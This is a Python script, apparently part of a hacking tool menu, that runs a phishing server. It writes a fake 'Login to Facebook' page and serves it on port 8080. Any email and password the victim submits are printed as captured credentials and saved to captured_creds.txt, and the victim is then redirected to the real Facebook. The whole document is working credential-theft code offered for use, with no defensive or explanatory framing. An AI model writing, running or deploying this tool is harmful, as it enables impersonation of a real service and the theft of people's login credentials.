# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import os
import http.server
import socketserver
import threading
import time

PORT = 8080

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\033[1;32m[*] ", end=""); print(f"\n\033[1;31m[!] CREDENTIALS CAPTURED: {post_data}\033[0m")
        
        with open("captured_creds.txt", "a") as f:
            f.write(f"Time: {time.ctime()} | Data: {post_data}\n")
            
        self.send_response(302)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()

def start_server():
    # Create a simple login page
    with open("index.html", "w") as f:
        f.write("""
        <html>
        <body style='font-family: Arial; text-align: center; margin-top: 100px;'>
            <h2>Login to Facebook</h2>
            <form method='POST'>
                <input type='text' name='email' placeholder='Email' required><br><br>
                <input type='password' name='pass' placeholder='Password' required><br><br>
                <button type='submit'>Login</button>
            </form>
        </body>
        </html>
        """)

    handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("\033[1;32m[*] ", end=""); print(f"\033[1;32m[+] Phishing Server Active at: http://127.0.0.1:{PORT}\033[0m")
        print("\033[1;32m[*] ", end=""); print("[*] Waiting for victim... (Press Ctrl+C to stop and return to menu)")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\033[1;32m[*] ", end=""); print("\n[!] Stopping Server...")
            httpd.shutdown()

if __name__ == "__main__":
    start_server()
